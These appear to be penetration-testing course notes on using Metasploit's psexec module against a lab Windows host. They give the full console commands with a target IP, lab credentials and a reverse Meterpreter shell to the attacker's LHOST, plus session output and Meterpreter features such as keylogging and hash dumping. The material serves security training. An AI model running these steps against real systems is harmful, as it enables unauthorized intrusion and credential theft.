# 07 — Automating Payloads & Delivery with Metasploit

## Overview

Metasploit automates the entire exploit → payload → shell process. Instead of manually crafting one-liners, you select a module, set options, and run it. It contains **2,000+ exploits** and **590+ payloads** ready to use.

> Metasploit makes exploitation easy, but you're responsible for understanding what it's doing. Using tools blindly in a live engagement can be destructive.

---

## The Metasploit Workflow

```
1. Enumerate target (Nmap)
    ↓
2. Identify attack vector (e.g., SMB on port 445)
    ↓
3. Search for a module (search smb)
    ↓
4. Select the module (use <number>)
    ↓
5. Configure options (set RHOSTS, LHOST, credentials)
    ↓
6. Run it (exploit)
    ↓
7. Get a Meterpreter or system shell
```

---

## Starting Metasploit

```bash
sudo msfconsole
```

> Always run as root (`sudo`) — many modules need raw socket access.

---

## Finding a Module

### Step 1: Nmap scan to identify services

```bash
nmap -sC -sV -Pn TARGET_IP
```

Look for services + versions → pick an attack vector.

### Step 2: Search Metasploit for matching modules

```
msf6 > search smb
```

> Returns a table of modules. Key columns: **Name**, **Rank**, **Description**.

---

## Understanding Module Naming

Example: `exploit/windows/smb/psexec`

| Part | Meaning |
|------|---------|
| `exploit/` | Module type — this is an exploit (not scanner, not auxiliary) |
| `windows/` | Target platform |
| `smb/` | Target service / attack vector |
| `psexec` | The specific tool/technique used |

---

## Using a Module: SMB PSExec Example

### Select the module:

```
msf6 > use exploit/windows/smb/psexec
```

> MSF automatically assigns a default payload: `windows/meterpreter/reverse_tcp`

### View options:

```
msf6 exploit(windows/smb/psexec) > options
```

### Configure required settings:

```
msf6 exploit(windows/smb/psexec) > set RHOSTS 10.129.180.71
msf6 exploit(windows/smb/psexec) > set SHARE ADMIN$
msf6 exploit(windows/smb/psexec) > set SMBUser htb-student
msf6 exploit(windows/smb/psexec) > set SMBPass HTB_@cademy_stdnt!
msf6 exploit(windows/smb/psexec) > set LHOST 10.10.14.222
```

| Option | What It Sets |
|--------|-------------|
| `RHOSTS` | Target IP (Remote Host) |
| `SHARE` | SMB share to upload payload to (`ADMIN$` = default admin share) |
| `SMBUser` | Username to authenticate with |
| `SMBPass` | Password for that user |
| `LHOST` | Your attack box IP (for the reverse connection) |
| `LPORT` | Your listening port (default 4444) |

### Run the exploit:

```
msf6 exploit(windows/smb/psexec) > exploit
```

### Successful output:

```
[*] Started reverse TCP handler on 10.10.14.222:4444
[*] 10.129.180.71:445 - Authenticating to 10.129.180.71:445 as user 'htb-student'...
[*] 10.129.180.71:445 - Selecting PowerShell target
[*] 10.129.180.71:445 - Executing the payload...
[*] Sending stage (175174 bytes) to 10.129.180.71
[*] Meterpreter session 1 opened

meterpreter >
```

---

## Meterpreter vs Regular Shell

Meterpreter is a **special payload** — not just a raw shell. It uses in-memory DLL injection to stay stealthy.

| Feature | Raw Shell | Meterpreter |
|---------|-----------|-------------|
| Run system commands | ✅ | ✅ |
| Upload/download files | Manual (certutil, curl) | ✅ Built-in (`upload` / `download`) |
| Keylogger | ❌ | ✅ (`keyscan_start`) |
| Screenshot | ❌ | ✅ (`screenshot`) |
| Process management | Manual | ✅ (`ps`, `migrate`) |
| Service control | Manual | ✅ (`create`, `start`, `stop`) |
| Hash dumping | Manual | ✅ (`hashdump`) |
| In-memory execution | ❌ | ✅ (no files on disk) |
| Drop to system shell | N/A | ✅ (`shell` command) |

### Drop from Meterpreter to a system shell:

```
meterpreter > shell

C:\WINDOWS\system32>
```

> Use `shell` when you need native OS commands that Meterpreter doesn't support.

### List all Meterpreter commands:

```
meterpreter > ?
```

---

## MSF Quick Reference

| Command | What It Does |
|---------|-------------|
| `search <term>` | Find modules by keyword |
| `use <module>` | Select a module |
| `options` | Show configurable settings |
| `set <option> <value>` | Configure a setting |
| `exploit` or `run` | Execute the module |
| `back` | Deselect current module |
| `sessions` | List active shell sessions |
| `sessions -i <id>` | Interact with a specific session |
| `shell` | Drop from Meterpreter to OS shell |
| `?` | List available commands |

---

## Key Takeaways

| Point | Detail |
|-------|--------|
| **Metasploit automates everything** | Module selection → payload delivery → shell — all handled |
| **Default payload** | `windows/meterpreter/reverse_tcp` — reverse shell with advanced features |
| **PSExec module** | Requires valid admin creds — uploads payload to ADMIN$ share |
| **Meterpreter is stealthy** | In-memory DLL injection, no files written to disk |
| **Always understand the module** | Read the description and options before running — don't be reckless |
| **LHOST matters** | Must be your VPN tunnel IP, not your local network IP |
